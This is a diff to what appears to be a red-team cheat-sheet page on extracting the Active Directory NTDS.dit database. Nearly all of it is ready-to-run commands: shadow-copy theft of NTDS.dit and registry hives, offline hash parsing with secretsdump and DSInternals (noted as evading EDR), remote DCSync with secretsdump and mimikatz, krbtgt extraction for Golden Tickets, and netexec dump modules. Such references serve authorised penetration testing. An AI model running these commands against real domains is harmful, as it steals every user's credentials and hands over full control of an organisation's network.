@@ -13,7 +13,9 @@ title: "NTDS.DIT"
 
 NTDS.dit is the Active Directory database. It contains all domain credentials (password hashes for all domain users), Kerberos keys, and AD objects.
 
-## Local extraction
+## Local extraction (on the DC)
+
+> _The shadow copy number (`...ShadowCopy1`) returned by `vssadmin` is incremental and may differ - check with `vssadmin list shadows`._
 
 ::: code-group
 
@@ -21,11 +23,10 @@ NTDS.dit is the Active Directory database. It contains all domain credentials (p
 # Create shadow copy of C:
 vssadmin create shadow /for=C:
 
-# Copy NTDS.dit, SYSTEM, SAM, SECURITY (use shadow copy number 1)
-cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit
-cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\SYSTEM
-cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\SAM
-cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\SECURITY
+# Copy NTDS.dit + registry hives from the shadow (adjust the ShadowCopyN number)
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit    C:\Windows\Temp\NTDS.dit
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM   C:\Windows\Temp\SYSTEM
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY C:\Windows\Temp\SECURITY
 ```
 
 ```powershell [UnderlayCopy]
@@ -52,40 +53,47 @@ xcopy x:\Windows\System32\config\SYSTEM C:\
 
 :::
 
-## Extraction
-
-=== Remote
-
-```bash
-# ntdsutil module
-netexec smb $TARGET -u $USER -p $PASSWORD -M ntdsutil
-
-# vss module
-netexec smb $TARGET -u $USER -p $PASSWORD -M vss
-```
-
-=== Local
+## Parse hashes from collected files (offline)
 
 ::: code-group
 
-```powershell [mimikatz]
-lsadump::dcsync /user:krbtgt
+```bash [secretsdump]
+secretsdump -ntds ntds.dit -system system LOCAL
+```
+
+```powershell [DSInternals]
+# PowerShell offline parser, often bypasses signature-based EDR
+$key = Get-BootKey -SystemHiveFilePath .\SYSTEM
+Get-ADDBAccount -All -DBPath .\ntds.dit -BootKey $key
 ```
 
 :::
 
-## Extract hashes
+## 🎯 Remote extraction (preferred for red team)
 
-```bash
-secretsdump -ntds ntds.dit -system system -security security LOCAL
+> _Requires DA or any user with the `DS-Replication-Get-Changes-All` right (e.g. Exchange, printer accounts, misconfigured ACLs)._
+
+::: code-group
+
+```bash [secretsdump]
+# DCSync via DRSUAPI - NTLM hashes only
+secretsdump -just-dc-ntlm $DOMAIN/$USER:$PASSWORD@$DC
+
+# Full dump (hashes + Kerberos keys + cleartext from SECURITY)
+secretsdump $DOMAIN/$USER:$PASSWORD@$DC
+
+# Target a single account (e.g. krbtgt for a Golden Ticket)
+secretsdump -just-dc-user krbtgt $DOMAIN/$USER:$PASSWORD@$DC
 ```
 
-## Red Team alternatives (stealthier)
+```powershell [mimikatz]
+# DCSync from a Windows admin box - no file touch on the DC
+mimikatz # lsadump::dcsync /domain:$DOMAIN /user:krbtgt
+```
 
-| Tool                     | Description                                      | Command                                           |
-| ------------------------ | ------------------------------------------------ | ------------------------------------------------- |
-| **DSInternals**          | PowerShell, bypasses some EDRs                   | `Get-ADDBAccount -DBPath ntds.dit -BootKey $key`  |
-| **secretsdump** (remote) | No file transfer needed                          | `secretsdump -just-dc-ntlm domain/user@dc`        |
-| **DCSync**               | Pull hashes via replication (no NTDS.dit needed) | `mimikatz # lsadump::dcsync /user:domain\\krbtgt` |
+```bash [netexec]
+nxc smb $DC -u $USER -p $PASSWORD -M ntdsutil     # drops ntds.dit + SYSTEM via ntdsutil IFM
+nxc smb $DC -u $USER -p $PASSWORD -M vss          # drops files via vssadmin shadow copy
+```
 
-> For real red team: Prefer **DCSync** (if you have DA privileges) or **secretsdump remotely** over local NTDS.dit extraction.
+:::
